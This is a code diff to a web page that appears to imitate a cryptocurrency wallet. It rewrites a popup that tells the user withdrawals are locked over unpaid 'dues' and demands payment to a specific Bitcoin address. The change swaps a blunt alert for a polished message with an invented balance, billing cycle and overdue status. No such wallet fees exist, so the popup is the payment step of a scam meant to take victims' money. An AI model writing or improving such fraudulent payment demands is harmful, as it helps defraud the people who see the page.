@@ -193,11 +193,28 @@
     fetchBTCPrice();
     setInterval(fetchBTCPrice, 30000); // refresh every 30s
 
-    function showPaymentPopup() {
-      alert(
-        "Error: Wallet dues unpaid for 2 years.\n\nTo unlock withdrawals, send dues to:\n\nbtc address: bc1qnkw0damggha5xp98mh9ra63rtf4kxqp5l52qs8\n\nNeed BTC? Visit: https://www.coinbase.com/"
-      );
-    }
-  </script>
- </body>
-</html>
+  function showPaymentPopup() {
+  const message = `
+  🚫 Withdrawals Locked 🚫
+
+  Your wallet currently has **outstanding dues** that must be paid to enable withdrawals.
+
+  💰 **Outstanding Balance:** $120.00 USD equivalent in BTC  
+  📅 **Billing Cycle:** Annual (January 1 – December 31)  
+  ✅ **Status:** Payment Overdue
+
+  🔓 To unlock your wallet, please send the due amount to the following BTC address:
+
+  ➤ **Bitcoin Address:**  
+  bc1qnkw0damggha5xp98mh9ra63rtf4kxqp5l52qs8
+
+  📌 Once payment is confirmed, withdrawals will be re-enabled.
+
+  Need BTC?  
+  Visit: https://www.coinbase.com/
+
+  ⚠️ Note: Partial payments will not unlock your wallet.
+  `;
+  alert(message);
+}
+
